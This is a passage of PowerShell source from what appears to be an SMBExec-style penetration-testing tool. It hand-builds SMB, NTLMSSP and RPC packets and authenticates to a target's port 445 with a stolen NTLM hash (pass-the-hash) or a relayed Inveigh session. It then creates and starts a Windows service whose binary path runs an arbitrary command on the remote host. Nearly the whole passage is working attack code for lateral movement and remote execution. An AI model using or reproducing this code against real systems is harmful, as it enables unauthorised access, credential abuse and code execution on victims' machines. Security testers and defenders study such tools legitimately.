    $RPCRequest.Add("AuthLength",$auth_length)
    $RPCRequest.Add("CallID",$CallID)
    $RPCRequest.Add("AllocHint",$alloc_hint)
    $RPCRequest.Add("ContextID",$ContextID)
    $RPCRequest.Add("Opnum",$Opnum)

    if($data.Length)
    {
        $RPCRequest.Add("Data",$Data)
    }

    return $RPCRequest
}

#SCM

function New-PacketSCMOpenSCManagerW
{
    param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)

    $packet_referent_ID1 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $packet_referent_ID1 = $packet_referent_ID1.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $packet_referent_ID1 += 0x00,0x00
    $packet_referent_ID2 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $packet_referent_ID2 = $packet_referent_ID2.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $packet_referent_ID2 += 0x00,0x00

    $packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCMOpenSCManagerW.Add("MachineName_ReferentID",$packet_referent_ID1)
    $packet_SCMOpenSCManagerW.Add("MachineName_MaxCount",$packet_service_length)
    $packet_SCMOpenSCManagerW.Add("MachineName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("MachineName_ActualCount",$packet_service_length)
    $packet_SCMOpenSCManagerW.Add("MachineName",$packet_service)
    $packet_SCMOpenSCManagerW.Add("Database_ReferentID",$packet_referent_ID2)
    $packet_SCMOpenSCManagerW.Add("Database_NameMaxCount",[Byte[]](0x0f,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Database_NameOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Database_NameActualCount",[Byte[]](0x0f,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Database",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Unknown",[Byte[]](0xbf,0xbf))
    $packet_SCMOpenSCManagerW.Add("AccessMask",[Byte[]](0x3f,0x00,0x00,0x00))
    
    return $packet_SCMOpenSCManagerW
}

function New-PacketSCMCreateServiceW
{
    param([Byte[]]$ContextHandle,[Byte[]]$Service,[Byte[]]$ServiceLength,[Byte[]]$Command,[Byte[]]$CommandLength)
                
    $referent_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $referent_ID = $referent_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $referent_ID += 0x00,0x00

    $SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $SCMCreateServiceW.Add("ContextHandle",$ContextHandle)
    $SCMCreateServiceW.Add("ServiceName_MaxCount",$ServiceLength)
    $SCMCreateServiceW.Add("ServiceName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("ServiceName_ActualCount",$ServiceLength)
    $SCMCreateServiceW.Add("ServiceName",$Service)
    $SCMCreateServiceW.Add("DisplayName_ReferentID",$referent_ID)
    $SCMCreateServiceW.Add("DisplayName_MaxCount",$ServiceLength)
    $SCMCreateServiceW.Add("DisplayName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("DisplayName_ActualCount",$ServiceLength)
    $SCMCreateServiceW.Add("DisplayName",$Service)
    $SCMCreateServiceW.Add("AccessMask",[Byte[]](0xff,0x01,0x0f,0x00))
    $SCMCreateServiceW.Add("ServiceType",[Byte[]](0x10,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("ServiceStartType",[Byte[]](0x03,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("ServiceErrorControl",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("BinaryPathName_MaxCount",$CommandLength)
    $SCMCreateServiceW.Add("BinaryPathName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("BinaryPathName_ActualCount",$CommandLength)
    $SCMCreateServiceW.Add("BinaryPathName",$Command)
    $SCMCreateServiceW.Add("NULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("TagID",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("NULLPointer2",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("DependSize",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("NULLPointer3",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("NULLPointer4",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("PasswordSize",[Byte[]](0x00,0x00,0x00,0x00))

    return $SCMCreateServiceW
}

function New-PacketSCMStartServiceW
{
    param([Byte[]]$ContextHandle)

    $SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $SCMStartServiceW.Add("ContextHandle",$ContextHandle)
    $SCMStartServiceW.Add("Unknown",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SCMStartServiceW
}

function New-PacketSCMDeleteServiceW
{
    param([Byte[]]$ContextHandle)

    $SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $SCMDeleteServiceW.Add("ContextHandle",$ContextHandle)

    return $SCMDeleteServiceW
}

function New-PacketSCMCloseServiceHandle
{
    param([Byte[]]$ContextHandle)

    $SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $SCM_CloseServiceW.Add("ContextHandle",$ContextHandle)

    return $SCM_CloseServiceW
}

function Get-StatusPending
{
    param ([Byte[]]$Status)

    if([System.BitConverter]::ToString($Status) -eq '03-01-00-00')
    {
        $status_pending = $true
    }

    return $status_pending
}

function Get-UInt16DataLength
{
    param ([Int]$Start,[Byte[]]$Data)

    $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

    return $data_length
}

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

if($PSBoundParameters.ContainsKey('Session'))
{
    $inveigh_session = $true
}

if($PSBoundParameters.ContainsKey('Session'))
{

    if(!$Inveigh)
    {
        Write-Output "[-] Inveigh Relay session not found"
        $startup_error = $true
    }
    elseif(!$inveigh.session_socket_table[$session].Connected)
    {
        Write-Output "[-] Inveigh Relay session not connected"
        $startup_error = $true
    }

    $Target = $inveigh.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
[Byte[]]$process_ID = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

if(!$inveigh_session)
{
    $client = New-Object System.Net.Sockets.TCPClient
    $client.Client.ReceiveTimeout = 60000
}

if(!$startup_error -and !$inveigh_session)
{

    try
    {
        $client.Connect($Target,"445")
    }
    catch
    {
        Write-Output "[-] $Target did not respond"
    }

}

if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$session].Connected))
{
    $client_receive = New-Object System.Byte[] 1024

    if(!$inveigh_session)
    {
        $client_stream = $client.GetStream()

        if($SMB_version -eq 'SMB2.1')
        {
            $stage = 'NegotiateSMB2'
        }
        else
        {
            $stage = 'NegotiateSMB'
        }

        while($stage -ne 'Exit')
        {

            try
            {

                switch ($stage)
                {

                    'NegotiateSMB'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID 0x00,0x00
                        $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        try
                        {    
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')
                            {
                                $SMB_version = 'SMB1'
                                $stage = 'NTLMSSPNegotiate'

                                if([System.BitConverter]::ToString($client_receive[39]) -eq '0f')
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        Write-Verbose "[+] SMB signing is required"
                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x82,0x08,0xa0
                                    }

                                }

                            }
                            else
                            {
                                $stage = 'NegotiateSMB2'

                                if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {

                                        if($signing_check)
                                        {
                                            Write-Verbose "[+] SMB signing is required"
                                        }

                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x80,0x08,0xa0
                                    }

                                }

                            }

                        }
                        catch
                        {

                            if($_.Exception.Message -like 'Exception calling "Read" with "3" argument(s): "Unable to read data from the transport connection: An existing connection was forcibly closed by the remote host."')
                            {
                                Write-Output "[-] SMB1 negotiation failed"
                                $negoitiation_failed = $true
                                $stage = 'Exit'
                            }

                        }

                    }

                    'NegotiateSMB2'
                    {

                        if($SMB_version -eq 'SMB2.1')
                        {
                            $message_ID = 0
                        }
                        else
                        {
                            $message_ID = 1
                        }

                        $tree_ID = 0x00,0x00,0x00,0x00
                        $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                        $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'NTLMSSPNegotiate'

                        if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {

                                if($signing_check)
                                {
                                    Write-Verbose "[+] SMB signing is required"
                                }

                                $SMB_signing = $true
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x15,0x82,0x08,0xa0
                            }

                        }
                        else
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is not required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {
                                $SMB_signing = $false
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x05,0x80,0x08,0xa0
                            }

                        }

                    }

                    'NTLMSSPNegotiate'
                    {

                        if($SMB_version -eq 'SMB1')
                        {
                            $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID 0x00,0x00

                            if($SMB_signing)
                            {
                                $packet_SMB_header["Flags2"] = 0x05,0x48
                            }

                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        }
                        else
                        {
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        }

                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }
                    
                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
                $negoitiation_failed = $true
            }

        }

        if(!$signing_check -and !$negoitiation_failed)
        {
            $NTLMSSP = [System.BitConverter]::ToString($client_receive)
            $NTLMSSP = $NTLMSSP -replace "-",""
            $NTLMSSP_index = $NTLMSSP.IndexOf("4E544C4D53535000")
            $NTLMSSP_bytes_index = $NTLMSSP_index / 2
            $domain_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 12) $client_receive
            $target_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 40) $client_receive
            $session_ID = $client_receive[44..51]
            $NTLM_challenge = $client_receive[($NTLMSSP_bytes_index + 24)..($NTLMSSP_bytes_index + 31)]
            $target_details = $client_receive[($NTLMSSP_bytes_index + 56 + $domain_length)..($NTLMSSP_bytes_index + 55 + $domain_length + $target_length)]
            $target_time_bytes = $target_details[($target_details.Length - 12)..($target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (Get-ChildItem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

            if($SMB_signing)
            {
                $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
                $session_key = $session_base_key
                $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
                $HMAC_SHA256.key = $session_key
            }

            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]
            $session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $session_key_length +
                                    $session_key_length +
                                    $session_key_offset +
                                    $negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            if($SMB_version -eq 'SMB1')
            {
                $SMB_user_ID = $client_receive[32,33]
                $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID $SMB_user_ID

                if($SMB_signing)
                {
                    $packet_SMB_header["Flags2"] = 0x05,0x48
                }

                $packet_SMB_header["UserID"] = $SMB_user_ID
                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
                $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }
            else
            {
                $message_ID++
                $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x01,0x00 $false $message_ID  $process_ID $tree_ID $session_ID
                $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
                $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
            }

            try
            {
                $client_stream.Write($client_send,0,$client_send.Length) > $null
                $client_stream.Flush()
                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                if($SMB_version -eq 'SMB1')
                {

                    if([System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        $login_successful = $true
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }
                else
                {
                    if([System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        $login_successful = $true
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
            }

        }

    }

    if($login_successful -or $inveigh_session)
    {

        if($inveigh_session)
        {

            if($inveigh_session -and $inveigh.session_lock_table[$session] -eq 'locked')
            {
                Write-Output "[*] Pausing due to Inveigh Relay session lock"
                Start-Sleep -s 2
            }

            $inveigh.session_lock_table[$session] = 'locked'
            $client = $inveigh.session_socket_table[$session]
            $client_stream = $client.GetStream()
            $session_ID = $inveigh.session_table[$session]
            $message_ID =  $inveigh.session_message_ID_table[$session]
            $tree_ID = 0x00,0x00,0x00,0x00
            $SMB_signing = $false
        }

        $SMB_path = "\\" + $Target + "\IPC$"

        if($SMB_version -eq 'SMB1')
        {
            $SMB_path_bytes = [System.Text.Encoding]::UTF8.GetBytes($SMB_path) + 0x00
        }
        else
        {
            $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
        }

        $named_pipe_UUID = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03

        if(!$Service)
        {
            $SMB_service_random = [String]::Join("00-",(1..20 | ForEach-Object{"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
            $SMB_service = $SMB_service_random -replace "-00",""
            $SMB_service = $SMB_service.Substring(0,$SMB_service.Length - 1)
            $SMB_service = $SMB_service.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
            $SMB_service_random += '00-00-00-00-00'
            $SMB_service_bytes = $SMB_service_random.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $SMB_service = $Service
            $SMB_service_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_service)

            if([Bool]($SMB_service.Length % 2))
            {
                $SMB_service_bytes += 0x00,0x00
            }
            else
            {
                $SMB_service_bytes += 0x00,0x00,0x00,0x00
                
            }

        }
        
        $SMB_service_length = [System.BitConverter]::GetBytes($SMB_service.Length + 1)

        if($CommandCOMSPEC -eq 'Y')
        {
            $Command = "%COMSPEC% /C `"" + $Command + "`""
        }
        else
        {
            $Command = "`"" + $Command + "`""
        }

        [System.Text.Encoding]::UTF8.GetBytes($Command) | ForEach-Object{$SMBExec_command += "{0:X2}-00-" -f $_}

        if([Bool]($Command.Length % 2))
        {
            $SMBExec_command += '00-00'
        }
        else
        {
            $SMBExec_command += '00-00-00-00'
        }    
        
        $SMBExec_command_bytes = $SMBExec_command.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}  
        $SMBExec_command_length_bytes = [System.BitConverter]::GetBytes($SMBExec_command_bytes.Length / 2)
        $SMB_split_index = 4256
        
        if($SMB_version -eq 'SMB1')
        {
            $stage = 'TreeConnectAndXRequest'

            while ($stage -ne 'Exit')
            {
            
                switch ($stage)
                {
            
                    'CheckAccess'
                    {

                        if([System.BitConverter]::ToString($client_receive[108..111]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($client_receive[88..107]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                        {
                            $SMB_service_manager_context_handle = $client_receive[88..107]

                            if($SMB_execute)
                            {
                                Write-Verbose "$output_username has Service Control Manager write privilege on $Target"  
                                $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                                $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                                if($SCM_data.Length -lt $SMB_split_index)
                                {
                                    $stage = 'CreateServiceW'
                                }
                                else
                                {
                                    $stage = 'CreateServiceW_First'
                                }

                            }
                            else
                            {
                                Write-Output "$output_username has Service Control Manager write privilege on $Target"
                                $SMB_close_service_handle_stage = 2
                                $stage = 'CloseServiceHandle'
                            }

                        }
                        elseif([System.BitConverter]::ToString($client_receive[108..111]) -eq '05-00-00-00')
                        {
                            Write-Output "[-] $output_username does not have Service Control Manager write privilege on $Target"
                            $stage = 'Exit'
                        }
                        else
                        {
                            Write-Output "[-] Something went wrong with $Target"
                            $stage = 'Exit'
                        }

                    }

                    'CloseRequest'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x04 0x18 0x07,0xc8 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBCloseRequest 0x00,0x40
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'TreeDisconnect'
                    }

                    'CloseServiceHandle'
                    {

                        if($SMB_close_service_handle_stage -eq 1)
                        {
                            Write-Verbose "Service $SMB_service deleted on $Target"
                            $SMB_close_service_handle_stage++
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle
                        }
                        else
                        {
                            $stage = 'CloseRequest'
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                        }

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
